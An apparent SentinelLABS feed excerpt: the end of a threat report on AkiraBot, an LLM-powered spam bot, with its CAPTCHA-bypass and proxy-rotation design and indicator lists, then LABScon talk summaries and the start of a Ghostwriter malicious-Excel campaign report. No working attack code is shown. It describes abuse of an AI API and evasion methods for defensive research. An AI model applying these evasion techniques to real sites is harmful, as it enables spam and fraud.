<figure id="attachment_117823" aria-describedby="caption-attachment-117823" style="width: 853px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_21.jpg" alt="Telegram sending functionality in monitor.py" width="853" height="403" class="size-full wp-image-117823" srcset="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_21.jpg 853w, https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_21-300x142.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_21-768x363.jpg 768w" sizes="auto, (max-width: 853px) 100vw, 853px" /><figcaption id="caption-attachment-117823" class="wp-caption-text">Telegram sending functionality in <em>monitor.py</em></figcaption></figure>
<h2>Telegram Detail</h2>
<p>The Telegram functionality, contained in the <code>monitor.py</code> and <code>monitor_random.py</code> scripts, is tied into proxy rotation and CAPTCHA defeat features contained within the bundled JavaScript file <code>script.js</code>.  The <code>monitor.py</code> script utilizes <code>pyautogui</code> to paste the contents of <code>script.js</code> into a browser developer console by scripting CTRL+SHIFT+J, followed by the paste command, eventually executing the JavaScript within the browser console.</p>
<figure id="attachment_117837" aria-describedby="caption-attachment-117837" style="width: 337px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_1.jpg" alt="pyautogui actions in monitor.py" width="337" height="369" class="size-full wp-image-117837" srcset="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_1.jpg 337w, https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_1-274x300.jpg 274w" sizes="auto, (max-width: 337px) 100vw, 337px" /><figcaption id="caption-attachment-117837" class="wp-caption-text"><em>pyautogui</em> actions in <em>monitor.py</em></figcaption></figure>
<p>The pasted and executed JavaScript is then responsible for attempting CAPTCHA refreshes and defeats on targeted URLs, reporting the status returned to a JSON file, <code>stats.json</code>. If a proxy rotation is required, to aid further in refreshing the CAPTCHA defeat attempts on a given URL, the <code>monitor.py</code> script handles this as well, rotating the used proxy though the iproxyonline service (<code>fxdx[.]in</code>).</p>
<p>Proxy rotation is generally enabled to avoid geographic or IP-based restrictions when repeatedly attempting to refresh and defeat CAPTCHAs. The Telegram status updates specifically report on proxy rotations and CAPTCHA submissions. Some versions of these scripts have the proxy rotation section commented out, indicating that it is an optional feature.</p>
<figure id="attachment_118102" aria-describedby="caption-attachment-118102" style="width: 702px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_22v2.jpg" alt="Telegram message submission + proxy rotation status in monitor.py" width="702" height="564" class="size-full wp-image-118102" srcset="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_22v2.jpg 702w, https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_22v2-300x241.jpg 300w" sizes="auto, (max-width: 702px) 100vw, 702px" /><figcaption id="caption-attachment-118102" class="wp-caption-text">Telegram message submission + proxy rotation status in <em>monitor.py</em></figcaption></figure>
<p>All of the analyzed <code>monitor.py</code> and <code>monitor_random.py</code> scripts contain the same Telegram token and <code>chat_id</code> combination.</p>
<figure id="attachment_118103" aria-describedby="caption-attachment-118103" style="width: 502px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_15v2.jpg" alt=" Telegram bot data in monitor.py" width="502" height="108" class="size-full wp-image-118103" srcset="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_15v2.jpg 502w, https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_15v2-300x65.jpg 300w" sizes="auto, (max-width: 502px) 100vw, 502px" /><figcaption id="caption-attachment-118103" class="wp-caption-text">Telegram bot data in <em>monitor.py</em></figcaption></figure>
<p>This Telegram <code>chat_id</code> is associated with the following Telegram user data:</p>
<pre>
(bot) username: htscasdasdadwoobot
Firstname: Shadow / hts
LastName: a_zarkawi
</pre>
<figure id="attachment_117829" aria-describedby="caption-attachment-117829" style="width: 511px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_16.jpg" alt="HTS Telegram bot referenced in monitor.py scripts" width="511" height="239" class="size-full wp-image-117829" srcset="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_16.jpg 511w, https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_16-300x140.jpg 300w" sizes="auto, (max-width: 511px) 100vw, 511px" /><figcaption id="caption-attachment-117829" class="wp-caption-text">HTS Telegram bot referenced in monitor.py scripts</figcaption></figure>
<h2>Infrastructure</h2>
<p>The spam messages frequently rotate the domain used, likely in an attempt to avoid detection. The oldest domain in use is <code>akirateam[.]com</code>, which was registered in January 2022 on a Germany-based IP, <code>91.195.240[.]94</code>, without further updates until March 2023. The second oldest domain is <code>goservicewrap[.]com</code>, which was registered in April 2024 and resolved to <code>86.38.202[.]110</code>, a Hostinger IP in Cyprus.</p>
<p>Several AkiraBot domains have interesting connections through historical DNS activity. The subdomain <code>mail.servicewrap-go[.]com</code> briefly shared a CNAME record pointing to <code>77980.bodis[.]com</code>, which is associated with various malicious activities, including a 2023 malvertising <a href="https://blog.sucuri.net/2023/07/malicious-injection-redirects-traffic-to-parked-domain.html" target="_blank" rel="noopener noreferrer">campaign</a>. This domain also received communications from several Windows executable files that were detected as various banking trojans.</p>
<p>An odd relationship stood out in anchor links referencing <code>77980.bodis[.]com</code>: the website <code>unj[.]digital</code> contained anchor links from December 2024 through February 2025 pointing to <code>77980.bodis[.]com</code>. UNJ Digital&#8217;s website describes itself as a digital marketing and software development firm. The subdomain <code>smtp.unj[.]digital</code> also has a CNAME record pointing to <code>77980.bodis[.]com</code>, fortifying a connection between these hosts. While the website now highlights offering digital content services, as of late 2024 the site showed a focus on increasing marketing revenue.</p>
<figure id="attachment_117815" aria-describedby="caption-attachment-117815" style="width: 894px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_9.jpg" alt="Screenshot of content on unj[.]digital circa October 2024" width="894" height="672" class="size-full wp-image-117815" srcset="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_9.jpg 894w, https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_9-300x226.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_9-768x577.jpg 768w" sizes="auto, (max-width: 894px) 100vw, 894px" /><figcaption id="caption-attachment-117815" class="wp-caption-text">Screenshot of content on <em>unj[.]digital</em> circa October 2024</figcaption></figure>
<figure id="attachment_117833" aria-describedby="caption-attachment-117833" style="width: 894px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_13.jpg" alt="Screenshot of content on unj[.]digital circa March 2025" width="894" height="672" class="size-full wp-image-117833" srcset="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_13.jpg 894w, https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_13-300x226.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_13-768x577.jpg 768w" sizes="auto, (max-width: 894px) 100vw, 894px" /><figcaption id="caption-attachment-117833" class="wp-caption-text">Screenshot of content on <em>unj[.]digital</em> circa March 2025</figcaption></figure>
<h2>Akira and ServiceWrap SEO</h2>
<p>AkiraBot uses two distinct themes in their SEO offering domain naming conventions: <a href="https://www.trustpilot.com/review/useakira.com" target="_blank" rel="noopener noreferrer">Akira</a> and <a href="https://www.trustpilot.com/review/servicewrapgo.com" target="_blank" rel="noopener noreferrer">ServiceWrap</a>. Reviews for both services on TrustPilot are similar: many 5-star reviews with similar, potentially AI-generated contents, and the occasional 1-star review complaining that the site is either a scam or has spammed the person leaving the review.</p>
<p>The 5-star reviews tend to follow a pattern where the reviewer has one previous review that was made 1-5 days before the Akira or ServiceWrap review. The review themes are very similar across these 5-star reviews, though the contents and structure are always unique. We believe the actor may be generating some fake reviews, though it is difficult to say with certainty.</p>
<p><figure id="attachment_117816" aria-describedby="caption-attachment-117816" style="width: 572px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_8.jpg" alt="Trustpilot review for servicewrapgo[.]com" width="572" height="275" class="size-full wp-image-117816" srcset="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_8.jpg 572w, https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_8-300x144.jpg 300w" sizes="auto, (max-width: 572px) 100vw, 572px" /><figcaption id="caption-attachment-117816" class="wp-caption-text">Trustpilot review for <em>servicewrapgo[.]com</em></figcaption></figure><br />
<figure id="attachment_117825" aria-describedby="caption-attachment-117825" style="width: 572px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_2.jpg" alt="Trustpilot review for useakira[.]com" width="572" height="507" class="size-full wp-image-117825" srcset="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_2.jpg 572w, https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_2-300x266.jpg 300w" sizes="auto, (max-width: 572px) 100vw, 572px" /><figcaption id="caption-attachment-117825" class="wp-caption-text">Trustpilot review for <em>useakira[.]com</em></figcaption></figure><br />
<figure id="attachment_117820" aria-describedby="caption-attachment-117820" style="width: 572px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_3.jpg" alt="Trustpilot review for useakira[.]com" width="572" height="455" class="size-full wp-image-117820" srcset="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_3.jpg 572w, https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_3-300x239.jpg 300w" sizes="auto, (max-width: 572px) 100vw, 572px" /><figcaption id="caption-attachment-117820" class="wp-caption-text">Trustpilot review for useakira[.]com</figcaption></figure></p>
<h2>Conclusion</h2>
<p>AkiraBot is a sprawling framework that has undergone multiple iterations to integrate new spamming target technologies and evade website defenses. We expect this campaign to continue to evolve as website hosting providers adapt defenses to deter spam. The author or authors have invested significant effort in this bot’s ability to bypass commonly used CAPTCHA technologies, which demonstrates that the operators are motivated to violate service provider protections.</p>
<p>AkiraBot’s use of LLM-generated spam message content demonstrates the emerging challenges that AI poses to defending websites against spam attacks. The easiest indicators to block are the rotating set of domains used to sell the Akira and ServiceWrap SEO offerings, as there is no longer a consistent approach in the spam message contents as there were with previous campaigns selling the services of these firms.</p>
<p>SentinelLABS thanks the OpenAI security team for their collaboration and continued efforts in deterring bad actors from abusing their services. The OpenAI team shared the following response following their investigation:</p>
<p><em>“We&#8217;re grateful to SentinelOne for sharing their research. Distributing output from our services for spam is against our policies. The API key involved is disabled, and we’re continuing to investigate and will disable any associated assets. We take misuse seriously and are continually improving our systems to detect abuse.”</em></p>
<h2>Indicators of Compromise</h2>
<p><b>Akira &amp; ServiceWrap Domains</b><br />
akirateam[.]com<br />
beservicewrap[.]pro<br />
firstpageprofs[.]com<br />
getkira[.]info<br />
go-servicewrap[.]com<br />
gogoservicewrap[.]com<br />
goservicewrap[.]com<br />
joinnowkira[.]org<br />
joinnowservicewraps[.]pro<br />
joinservicewrap[.]com<br />
joinuseakira[.]com<br />
kiraone[.]info<br />
letsgetcustomers[.]com<br />
loveservice-wrap[.]com<br />
mybkira[.]info<br />
onlyforyoursite[.]com<br />
searchengineboosters[.]com<br />
service-wrap[.]com<br />
servicewrap-go[.]com<br />
servicewrap[.]pro<br />
servicewrapgo[.]com<br />
servicewrapone[.]com<br />
theakirateam[.]com<br />
toakira[.]pro<br />
topservice-wrap[.]pro<br />
topservicewrap[.]com<br />
usekiara[.]com<br />
useproakira[.]com<br />
usethatakira[.]com<br />
wantkiara[.]info<br />
wearetherealpros[.]com<br />
wejoinkir[.]vip<br />
wethekira[.]shop<br />
wetheservicewrap[.]pro</p>
<p><b>AkiraBot Tool Archive SHA-1</b><br />
09ec44b6d3555a0397142b4308825483b479bf5a<br />
0de065d58b367ffb28ce53bc1dc023f95a6d0b89<br />
13de9fcd4e7c36d32594924975b7ef2b91614556<br />
2322964ea57312747ae9d1e918811201a0c86e9c<br />
253684ea43cb0456a6fec5728e1091ff8fcb27cf<br />
36b4e424ce8082d7606bb9f677f97c0f594f254d<br />
3a443c72995254400da30fe203f3fbf287629969<br />
3a7cc815b921166006f31c1065dadfeb8d5190e6<br />
4d24dd5c166fa471554ed781180e353e6b9642b7<br />
51ec20e5356bbebd43c03faae56fca4c3bbe318e<br />
55affc664472c4657c8534e0508636394eac8828<br />
5620b527dfc71e2ee7efb2e22a0441b60fd67b84<br />
5fde3180373c420cfa5cfdea7f227a1e1fe6936c<br />
62e66bae4b892593009d5261d898356b6d0be3ef<br />
6b65c296d9e1cda5af2f7dab94ce8e163b2a4ca8<br />
6c56b986893dd1de83151510f4b6260613c5fbb9<br />
6f342ff77cd43921210d144a403b8abb1e541a8b<br />
7129194c63ae262c814da8045879aed7a037f196<br />
71464c4f145c9a43ade999d385a9260aabcbf66d<br />
730192b0f62e37d4d57bae9ff14ec8671fbf051e<br />
769aa6ab69154ca87ccba0535e0180a985c21a0c<br />
76aab3ab0f3f16cf30d7913ff767f67a116ff1e7<br />
853fde052316be7887474996538b31f6ac0c3963<br />
9d43494c6f87414c67533cce5ec86754311631fc<br />
9f6ed2427e959e92eb1699024f457d87fa7b5279<br />
aa72065673dc543e6bf627c7479bfe8a5e42a9c4<br />
aac26242f4209bc59c82c8f223fcf2f152ce44bc<br />
b643a1f2c4eb436db26763d5e2527f6bebe8bcbf<br />
bbd754e36aee4702b9f20b90d509248945add4ea<br />
cb194612ed003eaf8d8cf6ed3731f21f3edeb161<br />
cc63ee921c29f47612096c34d6ee3ef244b33db2<br />
e12c6911997d7c2af5550b7e989f1dc57b6733b8<br />
eae675812c4274502051d6f2d36348f77a8464a0<br />
f1c7c5d0870fd0abb7e419f2c2ba8df42fa74667<br />
f2e71c9cbc4a18482a11ca3f54f2c958973360b4<br />
fb7fdcc2fe11e95065a0ce9041348984427ca0f4</p>
]]></content:encoded>
					
		
		
		<enclosure url="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot-ftr.jpg" length="614617" type="image/jpeg" />	</item>
		<item>
		<title>LABScon24 Replay &#124; A Walking Red Flag (With Yellow Stars)</title>
		<link>https://www.sentinelone.com/labs/labscon24-replay-a-walking-red-flag-with-yellow-stars/</link>
		
		<dc:creator><![CDATA[LABScon]]></dc:creator>
		<pubDate>Mon, 31 Mar 2025 13:00:23 +0000</pubDate>
				<category><![CDATA[labscon24]]></category>
		<guid isPermaLink="false">https://www.sentinelone.com/?post_type=labs&#038;p=115097</guid>

					<description><![CDATA[Dakota Cary and Eugenio Benincasa explore China's CTF ecosystem, highlighting competitions held by the Ministry of State Security and the PLA.]]></description>
										<content:encoded><![CDATA[<p>APT40 used CTFs at Hainan University to recruit hackers and source software vulnerabilities for operations. Jiangsu MSS received vulnerabilities from the Tianfu Cup. iSoon hosted their own CTF before their files were leaked on Github. Chinese intelligence cutouts tried to pitch US participants at RealWorldCTF. The list goes on.</p>
<p>A diverse ecosystem of CTFs exists in China and it has, until now, been largely ignored. Since 2017 when the PRC government issued rules to bolster cybersecurity competitions, incorporate them into talent cultivation and training programs, and limit the amount of money to be paid out in rewards, China’s security ecosystem has launched more than 150 unique competitions. Including competitions that are held annually, the number of events since 2017 exceeds 400.</p>
<p>Not all these competitions are software vulnerability competitions like Tianfu Cup—in fact, few are. Most are aimed at talent cultivation and recruiting, and many are hosted by the military, the intelligence services, or other arms of the state.</p>
<p>This talk explores the diversity of China’s CTF ecosystem, its major leagues and events, and the annual number of participants across society. It highlights competitions held expressly by the Ministry of State Security and the PLA—delving into the competitions’ particulars. Defenders with appropriate CTI collection capabilities will better understand how to target their collection efforts on specific individuals in China.</p>
<p><iframe loading="lazy" src="https://www.youtube.com/embed/YjKsGZkYOsE" width="700" height="392" frameborder="0" allowfullscreen="allowfullscreen"></iframe></p>
<h2>About the Authors</h2>
<p>Dakota Cary is a strategic advisory consultant at SentinelOne. His reports examine artificial intelligence and cybersecurity research at Chinese universities, the People’s Liberation Army’s efforts to automate software vulnerability discovery, and new policies to improve China’s cybersecurity-talent pipeline. Prior to SentinelOne, he was a research analyst at Georgetown University’s Center for Security and Emerging Technology on the CyberAI Project.</p>
<p>Eugenio Benincasa is a Senior Cyberdefense Researcher at the Center for Security Studies (CSS) at ETH Zurich. Prior to joining CSS, Eugenio worked as a Threat Analyst at the Italian Presidency of the Council of Ministers in Rome and as a Research Fellow at the think tank Pacific Forum in Honolulu, where he focused on cybersecurity issues. He also worked as a Crime Analyst at the New York City Police Department (NYPD).</p>
<h2>About LABScon</h2>
<p>This presentation was featured live at <a href="https://www.labscon.io/" target="_blank" rel="noopener noreferrer">LABScon</a> 2024, an immersive 3-day conference bringing together the world’s top cybersecurity minds, hosted by SentinelOne’s research arm, SentinelLABS.</p>
<p>Keep up with all the latest on <a href="https://www.labscon.io/" target="_blank" rel="noopener noreferrer">LABScon 2025</a> here.</p>
]]></content:encoded>
					
		
		
		<enclosure url="https://www.sentinelone.com/wp-content/uploads/2025/02/Dakota_LABScon24-ftr.jpg" length="613749" type="image/jpeg" />	</item>
		<item>
		<title>LABScon24 Replay &#124; Kryptina RaaS: From Unsellable Cast-off to Enterprise Ransomware</title>
		<link>https://www.sentinelone.com/labs/labscon24-replay-kryptina-raas-from-unsellable-cast-off-to-enterprise-ransomware/</link>
		
		<dc:creator><![CDATA[LABScon]]></dc:creator>
		<pubDate>Wed, 26 Mar 2025 13:00:16 +0000</pubDate>
				<category><![CDATA[labscon24]]></category>
		<guid isPermaLink="false">https://www.sentinelone.com/?post_type=labs&#038;p=115093</guid>

					<description><![CDATA[Jim Walter reveals how a recent leak provided insight into how Kryptina RaaS has been adapted for use in enterprise attacks. ]]></description>
										<content:encoded><![CDATA[<p>Kryptina RaaS is a Linux-focused RaaS platform &amp; service that started life as an unsellable giveaway. However, large-scale ransomware operations are now adopting the platform to extend their reach into Linux and cloud environments.</p>
<p>In this talk, Jim Walter reveals how a recent leak from a Mallox ransomware-affiliated actor’s staging server provided insight into how Kryptina has been adapted for use in enterprise attacks.</p>
<p>The presentation focuses on recent developments and provides an understanding of why threat actors are attracted to the Kryptina platform, and what this means in the context of victims and targeting.</p>
<p>Jim also dissects what was included in the May 2024 Mallox leak and improvements and modifications that threat actors have made to the Kryptina platform.</p>
<p><iframe loading="lazy" src="https://www.youtube.com/embed/SobaTW71C-A" width="700" height="392" frameborder="0" allowfullscreen="allowfullscreen"></iframe></p>
<h2>About the Author</h2>
<p>Jim Walter is a Senior Threat Researcher at SentinelOne focusing on evolving trends, actors, and tactics within the thriving ecosystem of cybercrime and crimeware. He specializes in the discovery and analysis of emerging cybercrime “services” and evolving communication channels leveraged by mid-level criminal organizations.</p>
<h2>About LABScon</h2>
<p>This presentation was featured live at <a href="https://www.labscon.io/" target="_blank" rel="noopener noreferrer">LABScon</a> 2024, an immersive 3-day conference bringing together the world’s top cybersecurity minds, hosted by SentinelOne’s research arm, SentinelLABS.</p>
<p>Keep up with all the latest on <a href="https://www.labscon.io/" target="_blank" rel="noopener noreferrer">LABScon 2025</a> here.</p>
]]></content:encoded>
					
		
		
		<enclosure url="https://www.sentinelone.com/wp-content/uploads/2025/02/Jim-LABScon24-ftr.jpg" length="73546" type="image/jpeg" />	</item>
		<item>
		<title>LABScon24 Replay &#124; Resilience and Protection in the Windows Ecosystem</title>
		<link>https://www.sentinelone.com/labs/labscon24-replay-resilience-and-protection-in-the-windows-ecosystem/</link>
		
		<dc:creator><![CDATA[LABScon]]></dc:creator>
		<pubDate>Wed, 12 Mar 2025 13:00:47 +0000</pubDate>
				<category><![CDATA[labscon24]]></category>
		<guid isPermaLink="false">https://www.sentinelone.com/?post_type=labs&#038;p=115081</guid>

					<description><![CDATA[Kim Zetter interviews David Weston on topics such as the fallout from the CrowdStrike outage, Windows Recall and improving Microsoft security. ]]></description>
										<content:encoded><![CDATA[<p>In this exclusive interview at LABScon 2024, award-winning investigative journalist Kim Zetter and Microsoft Corporate VP Enterprise and OS Security David Weston discuss Microsoft kernel security, the CrowdStrike outage, AI, and how Microsoft plans to improve the resilience and security of the Windows ecosystem.</p>
<p>As the world&#8217;s data has increasingly become associated with Microsoft infrastructure and exposed to Microsoft products, threat actors have focused their efforts on exploiting security weaknesses in the vendor&#8217;s operating system. Weston and Zetter explore how this has led Microsoft to raise the priority of security at the engineering level, even at the expense of curtailing operating system features.</p>
<p>In addition, the conversation ranges over how the CrowdStrike outage of 2024 led Microsoft to a new focus on resilience and to the development of a user mode API to restrict access to the kernel to third party products. Weston also discusses the need for security vendors to implement secure deployment practices to better protect customers from rogue updates and tackles questions around the use of AI and the controversial Windows Recall feature.</p>
<p><iframe loading="lazy" src="https://www.youtube.com/embed/7ne9e0YUrQI" width="700" height="392" frameborder="0" allowfullscreen="allowfullscreen"></iframe></p>
<h2>About the Authors</h2>
<p><a href="https://www.linkedin.com/in/dwizzzle/" target="_blank" rel="noopener noreferrer">David Weston</a> is Corporate Vice President, Enterprise and OS Security at Microsoft where he is responsible for the security engineering of Windows, Azure Linux, XBOX, Windows Server, the Azure OS as well as the Offensive Security Research &amp; Engineering Team.</p>
<p><a href="https://www.zetter-zeroday.com/" target="_blank" rel="noopener noreferrer">Kim Zetter</a> is an award-winning investigative journalist who has covered cybersecurity and national security for more than a decade, most notably for WIRED, where she wrote for thirteen years, and more recently for the New York Times Magazine, Politico, Washington Post, Motherboard, and Yahoo News. She has been voted one of the top ten security journalists in the country by security professionals and her journalism peers.</p>
<h2>About LABScon</h2>
<p>This presentation was featured live at <a href="https://www.labscon.io/" target="_blank" rel="noopener noreferrer">LABScon</a> 2024, an immersive 3-day conference bringing together the world’s top cybersecurity minds, hosted by SentinelOne’s research arm, SentinelLABS.</p>
<p>Keep up with all the latest on <a href="https://www.labscon.io/" target="_blank" rel="noopener noreferrer">LABScon 2025</a> here.</p>
]]></content:encoded>
					
		
		
		<enclosure url="https://www.sentinelone.com/wp-content/uploads/2025/02/weston-ftr.jpg" length="596345" type="image/jpeg" />	</item>
		<item>
		<title>LABScon24 Replay &#124; Farmyard Gossip: The Foreign Footprint in US Agriculture</title>
		<link>https://www.sentinelone.com/labs/labscon24-replay-farmyard-gossip-the-foreign-footprint-in-us-agriculture/</link>
		
		<dc:creator><![CDATA[LABScon]]></dc:creator>
		<pubDate>Wed, 05 Mar 2025 14:00:02 +0000</pubDate>
				<category><![CDATA[labscon24]]></category>
		<guid isPermaLink="false">https://www.sentinelone.com/?post_type=labs&#038;p=115077</guid>

					<description><![CDATA[Kristin Del Rosso &#038; Madeleine Devost explore the growing trend of foreign ownership of farmland and its implications for national security.]]></description>
										<content:encoded><![CDATA[<p>Who really owns America’s farmland, and why does it matter? In this deep dive into the secretive world of foreign investment in U.S. agricultural land, Kristin Del Rosso and Madeleine Devost explore the growing trend of foreign ownership, which has surged by 50% since 2017, and its profound implications for national security. Using the USDA’s data, the presenters shed light on how these investments could potentially impact everything from local economies to national defense.</p>
<p>The talk dives into the complexities of the USDA’s data collection methods, revealing how manual processes and outdated systems obscure the true extent of foreign ownership. It also discusses the critical role of the Committee on Foreign Investment in the United States (CFIUS) in safeguarding national interests, and the urgent need for improved data sharing and automation between CFIUS and the USDA.</p>
<p>Through real-life examples, including controversial land purchases near sensitive military sites, Kristin and Madeleine illustrate the potential risks and propose actionable recommendations to enhance transparency and security.</p>
<p><iframe loading="lazy" src="https://www.youtube.com/embed/0rsgZfj6MGE" width="700" height="392" frameborder="0" allowfullscreen="allowfullscreen"></iframe></p>
<h2>About the Authors</h2>
<p><a href="https://www.linkedin.com/in/kristindelrosso/" target="_blank" rel="noopener noreferrer">Kristin Del Rosso</a> is co-founder and managing director of DevSec, a research firm that provides advanced analytics blended with cyber investigation techniques to support analytics, investigations, and intelligence enrichment in novel ways. Prior to DevSec, she worked as the Public Sector Field CTO at Sophos, and has a background in security product management, threat intelligence, and reverse engineering.</p>
<p><a href="https://www.linkedin.com/in/madeleine-d-338805186/" target="_blank" rel="noopener noreferrer">Madeleine Devost</a> is an intelligence analyst at Nisos focusing on open-source investigations. Prior to Nisos, she worked as a threat intelligence and investigations consultant for a number of firms including Excivity, RiskIQ and Microsoft.</p>
<h2>About LABScon</h2>
<p>This presentation was featured live at <a href="https://www.labscon.io/" target="_blank" rel="noopener noreferrer">LABScon</a> 2024, an immersive 3-day conference bringing together the world’s top cybersecurity minds, hosted by SentinelOne’s research arm, SentinelLABS.</p>
<p>Keep up with all the latest on <a href="https://www.labscon.io/" target="_blank" rel="noopener noreferrer">LABScon 2025</a> here.</p>
]]></content:encoded>
					
		
		
		<enclosure url="https://www.sentinelone.com/wp-content/uploads/2025/02/farmyard_gossip-ftr.jpg" length="576096" type="image/jpeg" />	</item>
		<item>
		<title>Ghostwriter &#124; New Campaign Targets Ukrainian Government and Belarusian Opposition</title>
		<link>https://www.sentinelone.com/labs/ghostwriter-new-campaign-targets-ukrainian-government-and-belarusian-opposition/</link>
		
		<dc:creator><![CDATA[Tom Hegel]]></dc:creator>
		<pubDate>Tue, 25 Feb 2025 10:55:52 +0000</pubDate>
				<category><![CDATA[Belarus]]></category>
		<category><![CDATA[Russia]]></category>
		<category><![CDATA[Ukraine]]></category>
		<guid isPermaLink="false">https://www.sentinelone.com/?post_type=labs&#038;p=114319</guid>

					<description><![CDATA[Latest Ghostwriter campaign brings Belarusian opposition into its sights for the first time as it continues weaponizing XLS docs to drop malware.]]></description>
										<content:encoded><![CDATA[<h2>Executive Summary</h2>
<ul>
<li aria-level="1">SentinelLABS has observed a campaign targeting opposition activists in Belarus as well as Ukrainian military and government organizations.</li>
<li aria-level="1">The campaign has been in preparation since July-August 2024 and entered the active phase in November-December 2024.</li>
<li aria-level="1">Recent malware samples and command-and-control (C2) infrastructure activity indicate that the operation remains active in recent days.</li>
<li aria-level="1">SentinelLABS assesses that this cluster of threat activity is an extension of the long-running Ghostwriter campaign identified in previous public reporting.</li>
</ul>
<h2>Ghostwriter | Background</h2>
<p>Ghostwriter is a long-running campaign likely active since 2016 and subsequently described in various public reports throughout 2020 to 2024. The actor behind Ghostwriter campaigns is closely linked with Belarusian government espionage efforts, while most commonly reported under the APT names <a href="https://cloud.google.com/blog/topics/threat-intelligence/unc1151-linked-to-belarus-government/" target="_blank" rel="noopener noreferrer">UNC1151</a> (Mandiant) or <a href="https://cert.gov.ua/search/UAC-0057" target="_blank" rel="noopener noreferrer">UAC-0057</a> (CERT-UA). Some public reports may use the term &#8220;Ghostwriter APT&#8221; interchangeably to refer to both the threat actor and its associated campaigns.</p>
<p>Previous <a href="https://www.cardiff.ac.uk/__data/assets/pdf_file/0005/2699483/Ghostwriter-Report-Final.pdf" target="_blank" rel="noopener noreferrer">research</a> on the evolution of Ghostwriter noted how it operated successfully across a range of platforms, blending information manipulation with hacking to target a number of European countries. Reporting throughout 2022 to 2024 described <a href="https://cert.gov.ua/article/6280159" target="_blank" rel="noopener noreferrer">activity</a> in which malicious Excel documents were used to deliver PicassoLoader and Cobalt Strike payloads. Observed document lures were themed around issues pertaining to the Ukraine military and the <a href="https://cyble.com/blog/unc1151-strikes-again-unveiling-their-tactics-against-ukraines-ministry-of-defence/" target="_blank" rel="noopener noreferrer">likely targeting</a> of the Ministry of Defense.</p>
<p>SentinelLABS has observed new activity with multiple weaponized Excel documents containing lures pertaining to the interests of the Ukraine government, the Ukraine military and domestic Belarusian opposition. While some of the TTPs we have observed overlap with previous reporting, others are new, including adaptations of previously observed payloads such as PicassoLoader.</p>
<h2>Weaponized XLS 1 | &#8220;Political Prisoners in Minsk Courts&#8221;</h2>
<p>SentinelLABS analyzed an attack that started with a Google Drive shared document landing in the target’s inbox. The email originated from an account using the name “Vladimir Nikiforech” (<code>vladimir.nikiforeach@gmail[.]com</code>). The email link pointed to a downloadable RAR archive, which according to the internal timestamps was created on 2025-01-14 00:47:54, containing a malicious Excel workbook (<code>ebb30fd99c2e6cbae392c337df5876759e53730d</code>) with the file name <code>политзаключенные(по судам минска).xls</code> (“Political prisoners (across courts of Minsk).xls”).</p>
<p>The title of the lure indicates an interesting shift in Ghostwriter targeting. Although attribution for the 2021 Ghostwriter campaign <a href="https://www.cardiff.ac.uk/__data/assets/pdf_file/0005/2699483/Ghostwriter-Report-Final.pdf" target="_blank" rel="noopener noreferrer">pointed to</a> the Belarus state, this is the first time we have seen lures directly aimed at Belarus government opposition. The timing of the attack could have been motivated by the presidential election that <a href="https://en.wikipedia.org/wiki/2025_Belarusian_presidential_election" target="_blank" rel="noopener noreferrer">took place</a> shortly after on Jan 26, 2025.</p>
<p>The XLS document contains an obfuscated VBA macro which is activated when the document is opened and the user allows Office macros to run.</p>
